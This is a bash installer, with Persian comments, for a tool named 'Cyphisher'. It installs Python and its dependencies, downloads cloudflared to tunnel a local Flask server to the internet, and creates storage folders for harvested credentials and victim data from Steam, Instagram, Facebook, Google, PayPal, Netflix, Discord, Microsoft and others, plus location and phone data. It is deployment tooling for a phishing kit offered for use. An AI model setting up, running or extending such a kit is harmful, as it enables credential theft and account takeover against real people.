#!/usr/bin/env bash
set -euo pipefail

# ===============================
# Cyphisher Setup Script
# Multi-Platform Support
# ===============================

AUTO_CF="${AUTO_CF:-1}"
PYTHON_VERSION="${PYTHON_VERSION:-3.8+}"
PORT="${PORT:-5001}"

APP_FILE="main.py"
VENV_DIR="venv"
CF_DIR="cloud_flare"
CF_BIN=""
CF_LOG="cloudflared.log"
APP_LOG="app.log"
URL_FILE="cloudflared_url.txt"

log(){ printf "\n[setup] %s\n" "$*"; }
error(){ printf "\n[ERROR] %s\n" "$*" >&2; }

# تشخیص دقیق پلتفرم
detect_platform() {
    OS="$(uname -s | tr '[:upper:]' '[:lower:]')"
    ARCH="$(uname -m | tr '[:upper:]' '[:lower:]')"

    # تشخیص Termux
    IS_TERMUX=0
    if [ -n "${PREFIX-}" ] && echo "${PREFIX}" | grep -q "com.termux"; then
        IS_TERMUX=1
        OS="android"
    fi

    # تشخیص دقیق macOS
    if [[ "$OS" == "darwin" ]]; then
        if [[ -d "/Applications" ]] && [[ -d "/System" ]]; then
            OS="darwin"
        fi
    fi

    # تشخیص ویندوز
    if [[ "$OS" == *"mingw"* ]] || [[ "$OS" == *"cygwin"* ]] || [[ "$OS" == *"msys"* ]]; then
        OS="windows"
    fi

    # تشخیص معماری
    case "$ARCH" in
        "x86_64"|"amd64") ARCH="amd64" ;;
        "aarch64"|"arm64") ARCH="arm64" ;;
        "armv7l"|"armv7") ARCH="arm" ;;
        "i386"|"i686") ARCH="386" ;;
        "x86") ARCH="386" ;;
    esac

    log "Platform detected: OS=$OS ARCH=$ARCH TERMUX=$IS_TERMUX"
}

install_python() {
    log "Checking Python installation..."
    
    if command -v python3 >/dev/null 2>&1; then
        PY_VERSION=$(python3 -c "import sys; print(f'{sys.version_info.major}.{sys.version_info.minor}')" 2>/dev/null || echo "3.x")
        log "Python3 found: version $PY_VERSION"
        return 0
    fi

    log "Python3 not found. Installing..."
    
    case "$OS" in
        linux)
            if [ "$IS_TERMUX" -eq 1 ]; then
                pkg update -y && pkg install -y python || {
                    error "Failed to install Python on Termux"
                    return 1
                }
            else
                if command -v apt >/dev/null 2>&1; then
                    sudo apt update && sudo apt install -y python3 python3-pip python3-venv
                elif command -v yum >/dev/null 2>&1; then
                    sudo yum install -y python3 python3-pip
                elif command -v dnf >/dev/null 2>&1; then
                    sudo dnf install -y python3 python3-pip
                elif command -v apk >/dev/null 2>&1; then
                    sudo apk add python3 py3-pip
                elif command -v pacman >/dev/null 2>&1; then
                    sudo pacman -S python python-pip
                else
                    error "Please install Python3 manually on your Linux distribution"
                    return 1
                fi
            fi
            ;;
        darwin)
            if command -v brew >/dev/null 2>&1; then
                brew install python3
            else
                error "Please install Homebrew first: /bin/bash -c \"\$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)\""
                return 1
            fi
            ;;
        windows)
            if command -v choco >/dev/null 2>&1; then
                choco install -y python3
            else
                log "Please install Python3 from: https://www.python.org/downloads/"
                return 1
            fi
            ;;
        android)
            pkg update -y && pkg install -y python || {
                error "Failed to install Python on Termux"
                return 1
            }
            ;;
        *)
            error "Unsupported OS for automatic Python installation"
            return 1
            ;;
    esac

    if ! command -v python3 >/dev/null 2>&1; then
        error "Python installation failed. Please install manually."
        return 1
    fi

    log "Python installed successfully"
    return 0
}

install_required_tools() {
    log "Installing required system tools..."
    
    case "$OS" in
        linux|android)
            if [ "$IS_TERMUX" -eq 1 ]; then
                pkg install -y git curl wget unzip || true
            else
                if command -v apt >/dev/null 2>&1; then
                    sudo apt install -y git curl wget unzip
                elif command -v yum >/dev/null 2>&1; then
                    sudo yum install -y git curl wget unzip
                elif command -v apk >/dev/null 2>&1; then
                    sudo apk add git curl wget unzip
                fi
            fi
            ;;
        darwin)
            if command -v brew >/dev/null 2>&1; then
                brew install git curl wget unzip
            else
                # Fallback to direct download if brew not available
                if ! command -v git >/dev/null 2>&1; then
                    log "Please install Xcode command line tools: xcode-select --install"
                fi
            fi
            ;;
        windows)
            if command -v choco >/dev/null 2>&1; then
                choco install -y git curl wget unzip
            fi
            ;;
    esac
}

setup_virtualenv() {
    log "Setting up Python virtual environment..."
    
    # پیدا کردن پایتون
    if command -v python3 >/dev/null 2>&1; then
        PYTHON_CMD="python3"
    elif command -v python >/dev/null 2>&1; then
        PYTHON_CMD="python"
    else
        error "Python not found. Please install Python 3.8 or higher."
        exit 1
    fi

    # بررسی نسخه پایتون
    PY_VERSION=$($PYTHON_CMD -c "import sys; print(f'{sys.version_info.major}.{sys.version_info.minor}')" 2>/dev/null || echo "0.0")
    MAJOR_VERSION=$(echo $PY_VERSION | cut -d. -f1)
    MINOR_VERSION=$(echo $PY_VERSION | cut -d. -f2)

    if [ $MAJOR_VERSION -lt 3 ] || { [ $MAJOR_VERSION -eq 3 ] && [ $MINOR_VERSION -lt 8 ]; }; then
        error "Python 3.8 or higher required. Found version $PY_VERSION"
        exit 1
    fi

    # ایجاد محیط مجازی
    if [ ! -d "$VENV_DIR" ]; then
        $PYTHON_CMD -m venv "$VENV_DIR"
        log "Virtual environment created"
    fi

    # فعال سازی محیط مجازی
    if [ -f "${VENV_DIR}/bin/activate" ]; then
        source "${VENV_DIR}/bin/activate"
    elif [ -f "${VENV_DIR}/Scripts/activate" ]; then
        source "${VENV_DIR}/Scripts/activate"
    else
        error "Could not activate virtual environment"
        exit 1
    fi

    # آپگرید pip
    log "Upgrading pip and installing base packages..."
    pip install --upgrade pip setuptools wheel >/dev/null

    # نصب requirements.txt اگر وجود دارد
    if [ -f "requirements.txt" ]; then
        log "Installing requirements from requirements.txt..."
        pip install -r requirements.txt
    else
        log "requirements.txt not found, installing basic packages..."
        pip install rich pyfiglet requests flask
    fi

    log "Python environment setup completed"
}

download_cloudflared() {
    log "Downloading cloudflared for $OS $ARCH..."
    
    # مپ کردن asset مناسب برای پلتفرم
    case "$OS" in
        linux)
            case "$ARCH" in
                amd64) asset="cloudflared-linux-amd64" ;;
                arm64) asset="cloudflared-linux-arm64" ;;
                arm) asset="cloudflared-linux-arm" ;;
                386) asset="cloudflared-linux-386" ;;
                *) asset="cloudflared-linux-amd64" ;;
            esac
            ;;
        darwin)
            case "$ARCH" in
                arm64) asset="cloudflared-darwin-arm64" ;;
                amd64) asset="cloudflared-darwin-amd64" ;;
                *) asset="cloudflared-darwin-amd64" ;;
            esac
            ;;
        windows)
            case "$ARCH" in
                amd64) asset="cloudflared-windows-amd64.exe" ;;
                arm64) asset="cloudflared-windows-arm64.exe" ;;
                386) asset="cloudflared-windows-386.exe" ;;
                *) asset="cloudflared-windows-amd64.exe" ;;
            esac
            ;;
        android)
            case "$ARCH" in
                arm64) asset="cloudflared-linux-arm64" ;;
                arm) asset="cloudflared-linux-arm" ;;
                *) asset="cloudflared-linux-arm64" ;;
            esac
            ;;
        *)
            asset="cloudflared-linux-amd64"
            ;;
    esac

    url="https://github.com/cloudflare/cloudflared/releases/latest/download/${asset}"
    mkdir -p "$CF_DIR"

    if [ "$OS" = "windows" ]; then
        out_file="${CF_DIR}/cloudflared.exe"
    else
        out_file="${CF_DIR}/cloudflared"
    fi

    log "Downloading from: $url"
    
    # دانلود با curl یا wget
    if command -v curl >/dev/null 2>&1; then
        if curl -L -f -o "$out_file" "$url"; then
            log "Download successful with curl"
        else
            error "curl download failed"
            return 1
        fi
    elif command -v wget >/dev/null 2>&1; then
        if wget -O "$out_file" "$url"; then
            log "Download successful with wget"
        else
            error "wget download failed"
            return 1
        fi
    else
        error "Neither curl nor wget available"
        return 1
    fi

    # دادن مجوز اجرا برای سیستم‌های غیر ویندوز
    if [ "$OS" != "windows" ]; then
        chmod +x "$out_file"
    fi

    echo "$out_file"
}

find_cloudflared() {
    # جستجو در دایرکتوری cloud_flare
    if [ "$OS" = "windows" ]; then
        if [ -f "${CF_DIR}/cloudflared.exe" ]; then
            CF_BIN="$(pwd)/${CF_DIR}/cloudflared.exe"
            return 0
        fi
    else
        if [ -f "${CF_DIR}/cloudflared" ]; then
            CF_BIN="$(pwd)/${CF_DIR}/cloudflared"
            return 0
        fi
    fi

    # جستجو در مسیر جاری
    if [ "$OS" = "windows" ]; then
        if [ -f "cloudflared.exe" ]; then
            CF_BIN="$(pwd)/cloudflared.exe"
            return 0
        fi
    else
        if [ -f "cloudflared" ]; then
            CF_BIN="$(pwd)/cloudflared"
            return 0
        fi
    fi

    # جستجو در PATH سیستم
    if command -v cloudflared >/dev/null 2>&1; then
        CF_BIN="$(command -v cloudflared)"
        return 0
    fi

    return 1
}

setup_cloudflared() {
    log "Setting up cloudflared..."
    
    if find_cloudflared; then
        log "cloudflared found: $CF_BIN"
        return 0
    fi

    if [ "$AUTO_CF" = "1" ]; then
        log "cloudflared not found, attempting download..."
        if downloaded_bin=$(download_cloudflared); then
            CF_BIN="$downloaded_bin"
            log "cloudflared downloaded to: $CF_BIN"
            return 0
        else
            error "cloudflared download failed"
            return 1
        fi
    else
        error "cloudflared not found and AUTO_CF is disabled"
        return 1
    fi
}

create_directories() {
    log "Creating necessary directories..."
    
    directories=(
        "steam_Credentials" "insta_Credentials" "location_information" "uploads"
        "IG_FOLLOWER" "Facebook" "Github" "Google" "WordPress" "Django" "Netflix"
        "Discord" "Paypal" "Twitter" "Yahoo" "yandex" "snapchat" "Roblox"
        "adobe" "LinkedIN" "Gitlab" "Ebay" "Dropbox" "chatgpt" "Deepseek"
        "collected_data" "phone_data" "Twitch" "Microsoft"
    )
    
    for dir in "${directories[@]}"; do
        mkdir -p "$dir"
    done
    
    log "Directories created successfully"
}

verify_setup() {
    log "Verifying setup..."
    
    # بررسی پایتون
    if ! command -v python3 >/dev/null 2>&1 && ! command -v python >/dev/null 2>&1; then
        error "Python verification failed"
        return 1
    fi

    # بررسی محیط مجازی
    if [ ! -d "$VENV_DIR" ]; then
        error "Virtual environment verification failed"
        return 1
    fi

    # بررسی cloudflared
    if ! find_cloudflared; then
        log "Warning: cloudflared not available"
    else
        log "cloudflared verified: $CF_BIN"
    fi

    # بررسی دایرکتوری‌ها
    for dir in "steam_Credentials" "Facebook" "Google"; do
        if [ ! -d "$dir" ]; then
            error "Directory $dir not created"
            return 1
        fi
    done

    log "Setup verification completed successfully"
    return 0
}

run_application() {
    log "Starting Cyphisher application..."
    
    # تنظیم متغیر محیطی پورت
    export PORT="$PORT"
    
    # پیدا کردن پایتون در محیط مجازی
    if [ -f "${VENV_DIR}/bin/python" ]; then
        PYTHON_BIN="${VENV_DIR}/bin/python"
    elif [ -f "${VENV_DIR}/Scripts/python.exe" ]; then
        PYTHON_BIN="${VENV_DIR}/Scripts/python.exe"
    else
        error "Python binary not found in virtual environment"
        exit 1
    fi

    # بررسی وجود فایل اصلی
    if [ ! -f "$APP_FILE" ]; then
        error "Main application file $APP_FILE not found"
        exit 1
    fi

    log "Launching: $PYTHON_BIN $APP_FILE"
    log "Server will run on port: $PORT"
    
    if [ -n "$CF_BIN" ]; then
        log "cloudflared is available at: $CF_BIN"
        log "Tunnel will be created automatically when needed"
    else
        log "Warning: cloudflared not available - tunnel features will not work"
    fi

    # اجرای برنامه اصلی
    exec "$PYTHON_BIN" "$APP_FILE"
}

main() {
    log "Starting Cyphisher Setup..."
    
    # مرحله 1: تشخیص پلتفرم
    detect_platform
    
    # مرحله 2: نصب ابزارهای لازم
    install_required_tools
    
    # مرحله 3: نصب پایتون اگر وجود ندارد
    if ! install_python; then
        error "Python installation failed"
        exit 1
    fi
    
    # مرحله 4: راه‌اندازی محیط مجازی پایتون
    setup_virtualenv
    
    # مرحله 5: دانلود و تنظیم cloudflared
    setup_cloudflared
    
    # مرحله 6: ایجاد دایرکتوری‌های لازم
    create_directories
    
    # مرحله 7: تأیید نصب
    if ! verify_setup; then
        error "Setup verification failed"
        exit 1
    fi
    
    log "=== Setup Completed Successfully ==="
    log "Platform: $OS $ARCH"
    log "Python: $(python --version 2>/dev/null || echo 'Not found')"
    log "Virtual Environment: $VENV_DIR"
    log "Port: $PORT"
    
    if [ -n "$CF_BIN" ]; then
        log "Cloudflared: Available ($CF_BIN)"
    else
        log "Cloudflared: Not available (tunnel features disabled)"
    fi
    
    log "Starting application in 3 seconds..."
    sleep 3
    
    # پاک کردن صفحه و اجرای برنامه
    clear
    run_application
}

# اجرای اصلی
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    main "$@"
fi
